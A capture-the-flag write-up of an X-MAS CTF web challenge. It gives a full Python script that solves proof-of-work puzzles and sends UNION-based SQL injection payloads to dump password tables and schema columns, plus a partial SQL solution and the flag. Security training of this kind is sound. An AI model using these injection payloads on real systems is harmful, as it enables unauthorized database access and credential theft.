# Santa's Shady Toy Manufacturing Business Part 3 (web 1491)

Upon trying to enter the database again with our new credentials, we encounter a (pretty solid) proof of work for each query. From now on, each query takes more time, so enumerating data one by one is no longer practical...

```py
import itertools
import hashlib
import string

def pow(salt, hashval):
    print("Solving pow, plz wait")
    table = string.ascii_lowercase

    for v in itertools.product(table, repeat=7):
        if hashlib.md5(salt.encode() + (''.join(v)).encode()).hexdigest()[:6] == hashval:
            return ''.join(v)

```

Upon checking the database, in the table `sql_torture_but_with_kind_explanations` we get an explanation of what we need to do:

```
Are you still alive? good. Because now the database gets insane. I had to quit my job over this, so good luck to the poor manager who supersedes me, haha. I'll still try to explain what we got here, just from the kindness of my heart. No need to thank me :) Basically, the painting contains a XOR Key, which you use to XOR every one of the management passwords. Then, every single xored management password is a parameter to its corresponding final_chunk function. These final chunks will tell you how to form a final password. You will then need to look into the final bitfield byte tables and build another final string, where every table is a character from that string (you can figure out the characters if you look at the column names :) ). Pass the final password and the final bitfield thing to the zip password getter. That's the password for the zip archive encoded in the same way as the final string. That's the zip where we store the juicy secrets, usually we have scripts for us that do all the busy work for us, but since you are a new manager I think IT hasn't had the time to send them to you. You'll need to write that yourself. Also, the entire database refreshes all the passwords once every few seconds, so you'd need to write everything in one query. Good luck! You need to be one MEAN SQL wizard to figure this shit out.
```

This text "explains" the objective of the challenge, but it hides a lot of details. The actual process we will need to follow ends up being this (some details of which can only be found when you finish the previous parts):

- Read the painting table to find an XOR key. The painting actually contains a 10-character key which needs to be ceaser ciphered with a number also given in the painting table. Fortunately, the keys are located at a constant position.
- XOR the resulting key with each password in the `management_passwords` table.
- Call `get_final_chunk_for_id_#` on each XORed management password. Each function returns a pair (index of the final chunk, character in that position).
- Combine the final chunks back in order.
- Read the final bitfiend and zip file from column names. There are 61 tables of the form `final_bitfield_byte_#` and 161 tables of the form `zip_file_byte_#`. Each table has columns of the form `bit_#_set` which correspond to set bits in the byte.
- Pass the final bitfiend and reassembled final chunk to the `get_zip_password` function.
- Read both the results. We can unzip the password later.

Because you could start multiple sessions, I ended up cheesing the challenge - preparing three sessions in advance and having each prepare a proof of work ahead of time such that 3 queries could be sent in one password refresh cycle. That way I could do the hardest work in Python, and each query just needed to dump all the data at once or call functions. The `GROUP_CONCAT` and `CONCAT_WS` functions are very useful for this.

Here is my script for this:

```py
from pow import pow
import requests
import json
import sys
import string

# Off Google
def caesar(text, step, alphabets):
    def shift(alphabet):
        return alphabet[step:] + alphabet[:step]
    shifted_alphabets = tuple(map(shift, alphabets))
    joined_aphabets = ''.join(alphabets)
    joined_shifted_alphabets = ''.join(shifted_alphabets)
    table = str.maketrans(joined_aphabets, joined_shifted_alphabets)
    return text.translate(table)

with open(sys.argv[1]) as f:
    ck1 = json.load(f)
with open(sys.argv[2]) as f:
    ck2 = json.load(f)
with open(sys.argv[3]) as f:
    ck3 = json.load(f)

x1 = []
x2 = []
for x in range(26, 36):
    x1.append("x%d" % (x))
    x2.append("x%d" % x)

x1 = ",".join(x1)
x2 = ",".join(x2)
q = "WITH cK as (SELECT CONCAT(x27,x28) as k FROM painting LIMIT 1 OFFSET 93), b as (SELECT %s FROM painting LIMIT 1 OFFSET 61) SELECT CONCAT(cK.k,'|',%s) as k FROM cK, b" % (x1, x2)
q = "WITH k as (%s), w as (SELECT GROUP_CONCAT(pass SEPARATOR '.') as z FROM management_passwords ORDER BY id ASC), y as (SELECT GROUP_CONCAT(CONCAT(COLUMN_NAME,',',TABLE_NAME) SEPARATOR '.') as y from information_schema.columns WHERE TABLE_NAME LIKE '%s' LIMIT 1) SELECT CONCAT_WS('|',k.k,w.z,y.y) FROM k, w, y" % (q, '%byte%')
q = "' AND 1=2 UNION SELECT (%s) UNION SELECT (1) WHERE '" % q
# print(q)

url = "http://challs.xmas.htsp.ro:3001/redirect.php"
def get_pow(c):
    chall = requests.get(url, cookies=c).text.split("'")
    salt = chall[4]
    target = chall[6]
    print(salt, target)
    sol = pow(salt, target)
    print(sol)
    return sol
p1 = get_pow(ck1)
p2 = get_pow(ck2)
p3 = get_pow(ck3)

input("waiting: ")

from pwn import xor
r = requests.post(url, data={"work": p1, "goto": q}, cookies=ck1, allow_redirects=False)
r = r.headers["Location"][1:-5]
with open("tmp", "w") as f:
    f.write(r)
caesar_key, xor_key, management_passwords, columns = r.split("|")
xor_key = caesar(xor_key, int(caesar_key), (string.ascii_lowercase, string.ascii_uppercase))
management_passwords = [xor(xor_key, p) for p in management_passwords.split(".")]
max_bf = 0
max_zp = 0
for c in columns.split("."):
    col, tab = c.split(",")
    if tab.startswith("get_zip_byte_"):
        i = int(tab.replace("get_zip_byte_", ""))
        if i > max_zp: max_zp = i
    if tab.startswith("get_final_bitfield_byte_"):
        i = int(tab.replace("get_final_bitfield_byte_", ""))
        if i > max_bf: max_bf = i
print(max_bf, max_zp)
final_bitfield = bytearray(max_bf+1)
zip_file = bytearray(max_zp+1)

for c in columns.split("."):
    col, tab = c.split(",")
    if col == "no_bits_set": continue
    if tab.startswith("get_zip_byte_"):
        i = int(tab.replace("get_zip_byte_", ""))
        #print('z', i)
        zip_file[i] |= 2**(int(col.split("_")[1]))
    if tab.startswith("get_final_bitfield_byte_"):
        i = int(tab.replace("get_final_bitfield_byte_", ""))
        #print('f', i)
        final_bitfield[i] |= 2**(int(col.split("_")[1]))

print(xor_key)
print(management_passwords)
print(final_bitfield)
print(zip_file)

pws = []
for i in range(60):
    pws.append("get_final_chunk_for_id_%d(UNHEX('%s'))" % (i, management_passwords[i].hex()))
pws = ",".join(pws)
q = "CONCAT_WS('|', %s)" % pws
q = "' AND 1=2 UNION SELECT (%s) UNION SELECT (1) WHERE '" % q
# print(q)
r = requests.post(url, data={"work": p2, "goto": q}, cookies=ck2, allow_redirects=False)
password = r.headers["Location"][1:-5]
print(password)

final = [None] * 60
for chunk in password.split("|"):
    p, s = eval(chunk)
    final[p] = s
final = "".join(final)

q = "SELECT get_zip_password('%s', UNHEX('%s'))" % (final, final_bitfield.hex())
q = "' AND 1=2 UNION SELECT (%s) UNION SELECT (1) WHERE '" % q
# print(q)
r = requests.post(url, data={"work": p3, "goto": q}, cookies=ck3, allow_redirects=False)
# print(r)
print(r.headers["Location"])
```

## Partial "real" solution
I did put together a good part of a real solution but I lost interest on assembling the string XORs. On MySQL, you can XOR binary type strings together of any length but not in MariaDB which the server is running.

Here is what I had (... is repeated stuff):
```sql
WITH c AS (
    WITH x AS (
        WITH l AS (
            WITH w as (
                WITH cK as 
                (SELECT (ORD(x27)-48) as k FROM painting LIMIT 1 OFFSET 93), b as (SELECT ORD(x0) as x0, ... FROM painting LIMIT 1 OFFSET 61)
                SELECT CONCAT(CHAR(IF(b.x%d+k>122,b.x%d+k-26,IF(b.x%d>90,b.x%d+k,IF(b.x%d+k>90,b.x%d+k-26, ...) as k FROM cK, b"
            SELECT CAST(CONCAT(q,q,q,q,q,q,q,q) AS BINARY) as k FROM w
        )
        SELECT CAST(SUBSTRING(k FROM 1 FOR CHARACTER_LENGTH(pass)) ^ CAST(pass AS BINARY) AS CHAR) FROM management_passwords CROSS JOIN l ORDER BY id ASC
    )
    SELECT get_final_chunk_for_id_0(SELECT k from x LIMIT 1 OFFSET 0) as p FROM x
    UNION ALL
    SELECT get_final_chunk_for_id_1(SELECT k FROM x LIMIT 1 OFFSET 1) FROM x
)
SELECT get_zip_password(CONCAT(SELECT SUBSTRING(p FROM 4 FOR 1) FROM c WHERE SUBSTRING(p FROM 1 FOR 2) = '1,', ...), final_bitfield) FROM c
```

## Flag
`X-MAS{w00_w3_f1n4lly_d1d_1t!__w3_wr0t3_4_pr0gr4m_1n_SQL!!_41c2chc1}`
